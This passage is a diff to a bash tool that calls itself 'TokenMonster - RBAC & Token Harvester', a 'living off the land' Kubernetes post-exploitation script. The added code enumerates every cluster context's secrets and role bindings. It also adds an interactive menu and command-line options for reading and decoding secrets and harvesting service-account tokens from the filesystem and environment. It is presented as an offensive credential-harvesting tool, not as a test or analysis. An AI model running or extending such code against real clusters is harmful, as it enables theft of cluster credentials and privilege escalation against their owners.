-        fi
+    echo "========================================="
+    echo "📋 KUBECTL NATIVE MODE"
+    echo "========================================="
+    echo ""
+    
+    local clusters=$(kubectl config get-contexts -o name)
+    
+    for cluster in ${clusters}; do
+        echo "Checking cluster: $cluster"
+        kubectl config use-context "$cluster"
         
         echo ""
-        echo "--- ServiceAccount: $sa_name (namespace: $namespace) ---"
+        echo "=== Namespaces ==="
+        kubectl get namespaces -o name
         
-        # Get API resources and test permissions
-        kubectl api-resources --verbs=list --namespaced -o name | while read -r resource
-        do
-          # Test each verb for this resource
-          allowed_verbs=()
-          for verb in "${VERBS[@]}"
-          do
-            if kubectl auth can-i "$verb" "$resource" --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
-              allowed_verbs+=("$verb")
-            fi
-          done
-          
-          # Only print if there are allowed verbs
-          if [ ${#allowed_verbs[@]} -gt 0 ]; then
-            echo "  ✓ $resource: ${allowed_verbs[*]}"
-          fi
-        done
+        echo ""
+        echo "=== Service Accounts ==="
+        kubectl get serviceaccounts --all-namespaces
         
-        # Test cluster-scoped resources
-        kubectl api-resources --verbs=list --namespaced=false -o name | while read -r resource
-        do
-          allowed_verbs=()
-          for verb in "${VERBS[@]}"
-          do
-            if kubectl auth can-i "$verb" "$resource" --as="system:serviceaccount:$namespace:$sa_name" 2>/dev/null | grep -q "yes"; then
-              allowed_verbs+=("$verb")
-            fi
-          done
-          
-          if [ ${#allowed_verbs[@]} -gt 0 ]; then
-            echo "  ✓ $resource (cluster-scoped): ${allowed_verbs[*]}"
-          fi
-        done
-      done
+        echo ""
+        echo "=== Secrets (High Risk) ==="
+        kubectl get secrets --all-namespaces --sort-by=.metadata.namespace
+        
+        echo ""
+        echo "=== Analyzing RBAC ==="
+        kubectl get rolebindings --all-namespaces
+        kubectl get clusterrolebindings
+        
+        echo ""
+    done
+}
 
-      # Get all RoleBindings with namespace and name
-      echo ""
-      echo "=== RoleBindings Summary ==="
-      kubectl get rolebinding --all-namespaces -o json | jq -r '.items[] | select(.subjects[]? | select(.kind == "ServiceAccount")) | "\(.metadata.namespace)|\(.metadata.name)|\(.roleRef.name)|\(.subjects[] | select(.kind == "ServiceAccount") | .name)"' | while IFS='|' read -r namespace binding role subject
-      do
-        echo "  $subject (ns: $namespace) -> Role: $role via RoleBinding: $binding"
-      done
+# =============================================================================
+# INTERACTIVE MODE
+# =============================================================================
 
-      # Get all ClusterRoleBindings
-      echo ""
-      echo "=== ClusterRoleBindings Summary ==="
-      kubectl get clusterrolebinding -o json | jq -r '.items[] | select(.subjects[]? | select(.kind == "ServiceAccount")) | "\(.metadata.name)|\(.roleRef.name)|\(.subjects[] | select(.kind == "ServiceAccount") | .name)"' | while IFS='|' read -r binding role subject
-      do
-        echo "  $subject -> ClusterRole: $role via ClusterRoleBinding: $binding"
-      done
-      
-      echo ""
+interactive_mode() {
+    echo "========================================="
+    echo "🧌 TokenMonster - Interactive Mode"
+    echo "========================================="
+    echo ""
+    
+    while true; do
+        echo ""
+        echo "Commands:"
+        echo "  1) List pods in current namespace"
+        echo "  2) List secrets in current namespace"
+        echo "  3) List ConfigMaps in current namespace"
+        echo "  4) Read secret contents"
+        echo "  5) Analyze RBAC"
+        echo "  6) List namespaces"
+        echo "  7) Switch namespace"
+        echo "  8) Harvest LOTL tokens"
+        echo "  9) Exit"
+        echo ""
+        read -p "Select option: " option
+        
+        case $option in
+            1) k8s_get_pods "$K8S_NAMESPACE" "$K8S_TOKEN" ;;
+            2) k8s_get_secrets "$K8S_NAMESPACE" "$K8S_TOKEN" ;;
+            3) k8s_get_configmaps "$K8S_NAMESPACE" "$K8S_TOKEN" ;;
+            4)
+                read -p "Enter secret name: " secret_name
+                k8s_read_secret "$secret_name" "$K8S_NAMESPACE" "$K8S_TOKEN"
+                ;;
+            5) k8s_analyze_rbac "$K8S_NAMESPACE" "$K8S_TOKEN" ;;
+            6) k8s_get_namespaces "$K8S_TOKEN" ;;
+            7)
+                read -p "Enter namespace: " namespace
+                K8S_NAMESPACE="$namespace"
+                echo "[+] Switched to namespace: $K8S_NAMESPACE"
+                ;;
+            8) harvest_tokens_lotl ;;
+            9) echo "Exiting..."; exit 0 ;;
+            *) echo "[!] Invalid option" ;;
+        esac
     done
 }
 
@@ -580,21 +589,66 @@ run_kubectl_mode() {
 
 main() {
     echo ""
-    echo "╔════════════════════════════════════════════════════════════════╗"
+    echo "╔═════════════════════════════════════════════════════════════════╗"
     echo "║          🧌 TokenMonster - RBAC & Token Harvester 🧌          ║"
-    echo "║                    LOTL Edition with Tool Detection             ║"
-    echo "╚════════════════════════════════════════════════════════════════╝"
+    echo "║              Curl-Based LOTL Edition (kubectl-less)             ║"
+    echo "╚═════════════════════════════════════════════════════════════════╝"
     echo ""
     
-    # Detect available tools
-    detect_tools
+    # Detect environment and available tools
+    detect_environment
+    local env_result=$?
     
-    if [ $? -eq 0 ]; then
+    if [ $env_result -eq 0 ]; then
         # kubectl is available - run native mode
+        echo "[+] Running in kubectl native mode"
         run_kubectl_mode
     else
-        # kubectl not available - run LOTL mode
-        harvest_tokens_lotl
+        # kubectl not available - use curl-based LOTL mode
+        echo "[+] Running in curl-based LOTL mode"
+        
+        # Check for command line arguments
+        case "${1:-}" in
+            harvest)
+                harvest_tokens_lotl
+                ;;
+            list-pods)
+                k8s_get_pods "${2:-$K8S_NAMESPACE}" "$K8S_TOKEN"
+                ;;
+            list-secrets)
+                k8s_get_secrets "${2:-$K8S_NAMESPACE}" "$K8S_TOKEN"
+                ;;
+            read-secret)
+                if [ -z "$2" ]; then
+                    echo "[!] Usage: $0 read-secret <secret-name> [namespace]"
+                    exit 1
+                fi
+                k8s_read_secret "$2" "${3:-$K8S_NAMESPACE}" "$K8S_TOKEN"
+                ;;
+            analyze-rbac)
+                k8s_analyze_rbac "${2:-$K8S_NAMESPACE}" "$K8S_TOKEN"
+                ;;
+            interactive)
+                interactive_mode
+                ;;
+            --help|-h)
+                echo "Usage: $0 [command] [options]"
+                echo ""
+                echo "Commands:"
+                echo "  harvest              - Harvest tokens from filesystem and environment"
+                echo "  list-pods [ns]       - List pods in namespace (default: $K8S_NAMESPACE)"
+                echo "  list-secrets [ns]    - List secrets in namespace"
+                echo "  read-secret <name>   - Read and decode secret contents"
+                echo "  analyze-rbac [ns]    - Analyze RBAC permissions"
+                echo "  interactive          - Enter interactive mode"
+                echo "  --help               - Show this help message"
+                exit 0
+                ;;
+            *)
+                # Default: run interactive mode
+                interactive_mode
+                ;;
+        esac
     fi
 }
 
